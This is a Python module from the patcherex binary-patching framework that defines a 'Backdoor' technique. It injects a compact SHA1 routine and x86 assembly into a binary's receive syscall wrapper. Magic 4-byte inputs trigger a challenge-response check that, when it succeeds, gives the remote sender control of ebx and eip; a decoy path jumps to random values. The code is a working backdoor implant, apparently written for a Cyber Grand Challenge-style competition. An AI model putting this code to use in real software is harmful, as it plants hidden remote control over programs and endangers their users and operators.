import patcherex
import angr

import patcherex.utils as utils
import patcherex.cfg_utils as cfg_utils

import capstone
import logging
from patcherex.patches import *

l = logging.getLogger("patcherex.techniques.Backdoor")


class Backdoor(object):

    def __init__(self,binary_fname,backend):
        self.binary_fname = binary_fname
        self.patcher = backend
        self.nslot = 16

    def get_c_patch(self):
        code = '''
        // right now, this is compiled to 268 bytes with -Oz
        #define K1 0x5A827999
        #define K2 0x6ED9EBA1
        #define K3 0x8F1BBCDC
        #define K4 0xCA62C1D6
        //TODO it seems this is not used by final compiled code (but it is still present in the compiled code)
        // find a way to tell clang to remove it
        int ROTATE_LEFT(const int value, int shift) {
            unsigned int uvalue = (unsigned int)value;
            return (uvalue << shift) | (uvalue >> (32- shift));
        }
        // Update HASH[] by processing a one 64-byte block in MESSAGE[]
        __attribute__((__fastcall)) int SHA1(int MESSAGE[] )
        {
          // these arrays are not necessary but used to better highlight dependencies
          int B, C, D, E;
          int A,An;
          int K;
          int W[80];
          int FN;
          int i;

          A = 0x67452301;
          B = 0x98BADCFE;
          C = 0xEFCDAB89;
          D = 0x10325476;
          E = 0xC3D2E1F0;
          for ( i=0; i<80; ++i ){
            if ( i < 16 ){
              W[i] = MESSAGE[i];
            }else{
              W[i] = ROTATE_LEFT( W[i-3] ^ W[i-8] ^ W[i-14] ^ W[i-16], 1 );
            }

            if(i<20){
              K = K1;
              FN = (D ^ ( B & (C ^ D)));
            }else if(i<40){
              K = K2;
              FN =  (D ^ B ^ C);
            }else if(i<60){
              K = K3;
              FN = (B & C) | (D & (B ^ C));
            }else{
              K = K4;
              FN = (D ^ B ^ C);
            }

            An = FN + E + ROTATE_LEFT( A, 5 ) + W[i] + K;
            E = D;
            D = C;
            C = ROTATE_LEFT( B, 30 );
            A = An;
            B = A;
          }
          return (0x67452301 + A);
        }
        '''
        return AddCodePatch(code,"sha1_block",is_c=True,optimization="-Oz")

    def compute_patches(self,victim_addr):
        patches = []
        patches.append(AddRWDataPatch(4,"random_value"))
        patches.append(AddRWDataPatch(4,"nbytes"))
        patches.append(AddRWDataPatch(4,"backdoor_receive_buffer"))
        patches.append(AddRWDataPatch(1,"backdoor_receive_len"))
        patches.append(AddRWDataPatch(13,"backdoor_response_buffer"))
        patches.append(self.get_c_patch())
        code = '''
            ; get 4 rnd value retrying in the unlikely case, in which rnd failed
            xor esi, esi 
            _random_loop:
                cmp esi, 4
                je _random_exit
                mov ebx, {random_value}
                add ebx, esi
                xor ecx, ecx
                mov cl, 4
                sub ecx, esi
                mov edx, {nbytes}
                xor eax, eax
                mov al, 7
                int 0x80
                add esi, DWORD[{nbytes}]
                jmp _random_loop

            _random_exit:
                ret
        '''
        patches.append(AddCodePatch(code,name="get_4_rnd"))
        code = '''
            ; get 4 rnd value retrying in the unlikely case, in which rnd failed
            xor edi, edi 
            _receive_loop:
                cmp edi, 13
                je _receive_exit
                xor ebx, ebx
                inc ebx
                mov ecx, {backdoor_response_buffer}
                add ecx, edi
                xor edx, edx
                mov dl, 13
                sub edx, edi
                mov esi, {nbytes}
                xor eax, eax
                mov al, 3
                int 0x80 
                ; not checking for receive fail, if disconnect --> infinite loop, it should never happen with our pov
                add edi, DWORD[{nbytes}]
                jmp _receive_loop

            _receive_exit:
                ret
        '''
        patches.append(AddCodePatch(code,name="receive_13"))

        code = '''
            ; fast path: this code is added to every receive
            cmp BYTE [{backdoor_receive_len}], 4
            jae _exit_backdoor

            ; this code is executed at most 4 times unless receive failed
            ; esi, edx, ecx, ebx are free
            test eax, eax ; test if receive succeeded
            jne _exit_backdoor
            test ebx, ebx ; test if ebx is 0 (stdin)
            jne _exit_backdoor

            ; we do not check rx_bytes: the assumption is that the network will never split the 4 bytes we send 
            ; I think it is a correct assumption because on the pov side we send 4 bytes together and 4 is very small
            mov esi, edx
            xor ebx, ebx
            ; now edx is scratch
            ; the two counters will be esi (from count to 0) and bl (from 0 to 4, index in backdoor_receive_buffer)
            ; ecx (buf) is incremented once per loop and it is the index in buf
            _backdoor_receive_loop:
                mov bl, BYTE [{backdoor_receive_len}] ; bl is a counter inside our 4 byte buffer
                cmp bl, 4
                je _backdoor_entry_check ; we received 4 bytes already
                ; now esi is count
                ; we assume no fragmentation in the relevant 4 so min(count,rx_bytes)>=4 and rx_bytes<=count)
                test esi, esi
                je _exit_backdoor ; the received buffer is over
                ; ecx is buf+current_byte, we assume that buf+min(count,4) is still readable memory
                mov dl, BYTE [ecx]
                mov BYTE [{backdoor_receive_buffer}+ebx], dl
                
                inc BYTE [{backdoor_receive_len}]
                inc ecx
                dec esi

                jmp _backdoor_receive_loop

            _backdoor_entry_check:
                ; what we have to send from the pov has inverted endiannes! (0x9067b180 and 0x9067b181)
                cmp DWORD[{backdoor_receive_buffer}], 0x80b16790
                je _real_backdoor
                cmp DWORD[{backdoor_receive_buffer}], 0x81b16790
                je _fake_backdor
                jmp _exit_backdoor

            ; for both backdoors we want to give fake/real control over ebx and eip
            ; to avoid creating gadgets I put the code on the stack and I jump to the stack by push esp + ret
            ; in between push <code>, push esp and the final ret I put all the code for the backdoor logic
            ; so that an attacker cannot use push <code>, push esp without actually executing the backdoor code
            _real_backdoor:
                sub esp, 64 ; space for sha1 MESSAGE
                push 0xc35b5990 ; pop ecx, pop ebx, ret, nop: pop ecx is used to clean [esp] from the stack
                push esp
                call {get_4_rnd}
                
                mov eax, DWORD [{random_value}]
                and eax, 0x7ffff 
                mov DWORD [{random_value}], eax
                ; random_value is now the challenge (a value between 0 and 0x7ffff, 0.5M possibilities)

                ; send the challenge value
                xor edi, edi
                _trasmit_loop:
                    cmp edi, 4
                    je _trasmit_exit
                    xor ebx, ebx ; stdout
                    mov ecx, {random_value}
                    xor edx, edx
                    mov dl, 4
                    mov esi, {nbytes}
                    xor eax, eax
                    mov al, 2
                    int 0x80
                    add edi, DWORD [{nbytes}]
                    jmp _trasmit_loop
                _trasmit_exit:

                call {receive_13}
                ; backdoor_response_buffer is: challenge_response (5), ebx (4), eip (4)
                ; copy the challenge response on the stack where created space for sha1 input buffer
                xor ecx, ecx
                _copy_response_loop:
                    cmp cl, 5
                    je _copy_response_exit
                    mov bl, BYTE [{backdoor_response_buffer}+ecx]
                    mov BYTE[esp+8+ecx], bl
                    inc cl
                    jmp _copy_response_exit
                _copy_response_exit:

                ; call sha1 passing the buffer on the stack as arg
                mov ecx, esp
                add ecx, 8
                %s
                ; now we have the result in eax
                cmp eax, DWORD [{random_value}] ; this is the challenge/response check!
                ; note that the check is actually checking 32 bits, out of which 19 are not zero
                jne _fake_backdor ; check failed, just send the execution to a bad place

                ; now copy the transmitted ebx and eip
                xor ecx, ecx
                xor edx, edx
                mov cl, 5
                _copy_response_loop2:
                    cmp cl, 13
                    je _copy_response_exit
                    mov bl, BYTE [{backdoor_response_buffer}+ecx]
                    mov BYTE[esp+8+edx], bl
                    inc cl
                    inc edx
                    jmp _copy_response_exit2
                _copy_response_exit2:

                ; magically ret will jump to the stack, executing pop, pop, ret (setting ebx, eip to the sent values)
                ret

            _fake_backdor:
            ;   ; set the stack as in the real backdoor
                push 0xc35b5990 ; pop ecx, pop ebx, ret, nop: pop ecx is used to clean [esp] from the stack
                push esp
                call {get_4_rnd}
                call {receive_13}

                ; copy 8 bytes from the received ones, to the stack but xor them with random_value to make this fail
                mov edx, DWORD [{backdoor_response_buffer}]
                xor edx, DWORD [{random_value}]
                mov DWORD [esp+8], edx
                xor ecx, ecx
                mov cl, 4
                mov edx, DWORD [{backdoor_response_buffer}+ecx]
                xor edx, DWORD [{random_value}]
                mov DWORD [esp+12], edx

                ; will start executing the stack but the gadget will use random data (so ebx and eip are random)
                ret

            _exit_backdoor:
        '''%utils.get_nasm_c_wrapper_code("sha1_block",get_return=True,debug=False)
        patches.append(InsertCodePatch(victim_addr,code,name="backdoor_receive_checker",priority=200))
        return patches


    def get_patches(self):
        patches = []
        cfg = self.patcher.cfg

        receive_wrapper = [ff for ff in cfg.functions.values() if \
                cfg_utils.detect_syscall_wrapper(self.patcher,ff) == 3] 
        if len(receive_wrapper) != 1:
            l.warning("Found %d receive_wrapper... better not to touch anything"%len(receive_wrapper))
            return []
        receive_wrapper = receive_wrapper[0]
        #import IPython; IPython.embed()
        # here we assume that receive_wrapper is a "sane" syscall wrapper, as checked by detect_syscall_wrapper
        last_block = [b for b in receive_wrapper.blocks if b.addr != receive_wrapper.addr][0]
        victim_addr = int(last_block.addr)
        patches.extend(self.compute_patches(victim_addr))

        return patches
